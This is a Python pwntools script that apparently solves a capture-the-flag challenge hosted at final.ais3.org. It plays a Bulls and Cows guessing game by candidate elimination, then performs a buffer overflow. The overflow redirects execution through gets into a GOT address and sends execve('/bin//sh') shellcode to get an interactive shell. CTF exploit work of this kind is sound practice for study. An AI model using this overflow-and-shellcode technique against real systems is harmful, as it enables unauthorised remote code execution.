import re
from pwn import *
from random import randint, shuffle
from time import sleep

def hasrepeats(n):
    return len(n) != len(set(n))

ctable = [ [0] * 6 for _ in range(10) ]
row = 0

def judge(a, b):
    bulls = 0
    cows = 0
    for x in range(4):
        for y in range(4):
            if x == y and a[x] == b[y]:
                bulls += 1
            if x != y and a[x] == b[y]:
                cows += 1
    return bulls, cows

def rand4():
    return [ randint(0, 9) for _ in range(4) ]

def norep_rand4():
    m = list(range(10))
    shuffle(m)
    return m[:4]

def check():
    global pwn, row

    n = array2int(ctable[row][:4])
    pwn.sendline(str(n))
    r = pwn.recvline()
    m = re.search(r' (\d) A (\d) B', r)
    if not m:
        print('[-] Fatal error: can not found A / B pattern... %s' % repr(r))
        exit()
    A, B = m.group(1), m.group(2)
    A, B = int(A), int(B)
    print('[*] %d A %d B' % (A, B))
    return A, B

def array2int(arr):
    return int(''.join(str(i) for i in arr), 10)

def int2array(n):
    return [ int(i, 10) for i in ('%.4d' % n) ]

def increment(iguess):
    n = array2int(iguess) + 1
    return int2array(n)

def checkfit(guess):
    global row
    if len(guess) > 4:
        print('[-] Error: guess tooooooooo long')
        raise Exception('TOO_LONG')
    for i in range(row):
        score = judge(guess, ctable[i][:4])
        if score[0] != ctable[i][4] or score[1] != ctable[i][5]:
            return False
    return True

def guess():
    global row
    if row == 0:
        cguess = norep_rand4()
    else:
        cguess = increment(ctable[row][:4])
        while not checkfit(cguess):
            cguess = increment(cguess)

    print('[*] Trying... %s' % cguess)
    ctable[row][:4] = cguess
    A, B = check()
    if A == 4:
        return True
    ctable[row][4:6] = [A ,B]
    row += 1
    return False

def go_pwn():
    global pwn
    pwn = remote('final.ais3.org', 9192)
    pwn.recvuntil(': ')

    while not guess():
        pass

    pwn.recvuntil('name: ')
    pwn.send('A' * 28)
    pt = 0x0804A00C
    fwrite = 0x08048470
    stdout = 0x0804A060
    gets   = 0x08048430
    gotplt = 0x0804A00c

    pwn.send(p32(gets))
    pwn.send(p32(gotplt)) # ret
    pwn.send(p32(gotplt)) # jump there
    pwn.sendline('')
    pwn.sendline("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
    pwn.interactive()

while True:
    try:
        go_pwn()
        break
    except Exception, e:
        if str(e) != 'TOO_LONG':
            pwn.close()
            raise e
        else:
            row = 0
            print '[*] Retrying...'
            sleep(0.1)
